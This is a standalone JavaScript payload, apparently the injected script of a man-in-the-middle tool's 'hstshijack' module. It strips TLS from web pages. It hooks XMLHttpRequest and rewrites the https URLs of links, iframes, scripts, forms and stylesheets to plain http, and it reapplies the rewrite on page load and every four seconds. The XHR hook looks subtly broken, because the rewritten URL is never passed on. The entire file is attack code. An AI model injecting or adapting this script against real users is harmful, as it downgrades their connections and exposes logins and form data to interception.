(function(){
	"use strict";

	var obf_hstshijack_func_open = XMLHttpRequest.prototype.open;

	function obf_hstshijack_func_hook_XMLHttpRequest() {
		XMLHttpRequest.prototype.open = function(
			obf_hstshijack_var_method,
			obf_hstshijack_var_url,
			obf_hstshijack_var_async,
			obf_hstshijack_var_username,
			obf_hstshijack_var_password
		) {
			var obf_hstshijack_var_url = obf_hstshijack_var_url.replace(/(http)s/ig, "$1");
			return obf_hstshijack_func_open.apply(this, arguments);
		}
	}

	function obf_hstshijack_func_hook_nodes() {
		document.querySelectorAll("a,iframe,script,form,link").forEach(function(obf_hstshijack_var_node){
			try {
				switch (obf_hstshijack_var_node.tagName) {
					case "A":
						if (obf_hstshijack_var_node.href && obf_hstshijack_var_node.href.match(/^\s*https:/i)) {
							obf_hstshijack_var_node.href = obf_hstshijack_var_node.href.replace(/(http)s/i, "$1");
						}
						break;
					case "IFRAME":
						if (obf_hstshijack_var_node.src && obf_hstshijack_var_node.src.match(/^\s*https:/i)) {
							obf_hstshijack_var_node.src = obf_hstshijack_var_node.src.replace(/(http)s/i, "$1");
						}
						break;
					case "SCRIPT":
						if (obf_hstshijack_var_node.src && obf_hstshijack_var_node.src.match(/^\s*https:/i)) {
							obf_hstshijack_var_node.src = obf_hstshijack_var_node.src.replace(/(http)s/i, "$1");
						}
						break;
					case "FORM":
						if (obf_hstshijack_var_node.action && obf_hstshijack_var_node.action.match(/^\s*https:/i)) {
							obf_hstshijack_var_node.action = obf_hstshijack_var_node.action.replace(/(http)s/i, "$1");
						}
						break;
					case "LINK":
						if (obf_hstshijack_var_node.href && obf_hstshijack_var_node.href.match(/^\s*https:/i)) {
							obf_hstshijack_var_node.href = obf_hstshijack_var_node.href.replace(/(http)s/i, "$1");
						}
						break;
				}
			} catch(obf_hstshijack_var_ignore) {}
		});
	}

	try {
		obf_hstshijack_func_hook_XMLHttpRequest();
	} catch(obf_hstshijack_var_ignore) {}

	try {
		obf_hstshijack_func_hook_nodes();
	} catch(obf_hstshijack_var_ignore) {}

	try {
		obf_hstshijack_func_hook_XMLHttpRequest();
		globalThis.addEventListener("DOMContentLoaded", obf_hstshijack_func_hook_nodes);
		globalThis.addEventListener("load", obf_hstshijack_func_hook_nodes);
		setInterval(obf_hstshijack_func_hook_nodes, 4000);
	} catch(obf_hstshijack_var_ignore) {}
})();

